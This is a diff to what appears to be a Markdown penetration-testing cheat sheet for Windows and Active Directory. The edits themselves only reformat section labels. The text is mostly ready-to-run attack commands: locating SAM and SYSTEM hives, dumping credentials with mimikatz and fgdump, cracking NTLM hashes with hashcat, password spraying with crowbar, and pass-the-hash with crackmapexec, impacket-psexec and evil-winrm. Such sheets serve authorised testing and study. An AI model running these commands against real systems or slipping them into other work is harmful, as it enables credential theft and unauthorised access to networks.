@@ -8,22 +8,22 @@
          SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
          Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system
 
-`Extracting Hashes in cache`
+### Extracting Hashes in cache
 
          fgdump.exe
          /usr/share/windows-binaries/fgdump/fgdump.exe
 
-`Dump the credentials of all connected users, including cached hashes`
+### Dump the credentials of all connected users, including cached hashes
 
          ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
          ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 
-`Cracking Ad Hashes`
+### Cracking Ad Hashes
 
          ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
          ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
-`Password Spraying`
+### Password Spraying
 
  -   Create Password List  
      `crunchy <length> <length> -t <pw-core>%%%% `
@@ -31,12 +31,12 @@
 -    Spray  
      `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
 
-`PASS THE PW`
+### PASS THE Password
 
          crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
         
 
-`Pass the Hash`
+### Pass the Hash
 
 - Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```
@@ -55,7 +55,7 @@ impacket-psexec '<domain>/<user>'@<IP>
 evil-winrm -i <IP> -u <user> -H <hash>
 ```
 
-`Over Pass the Hash`
+### Over Pass the Hash
 
 - Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
 
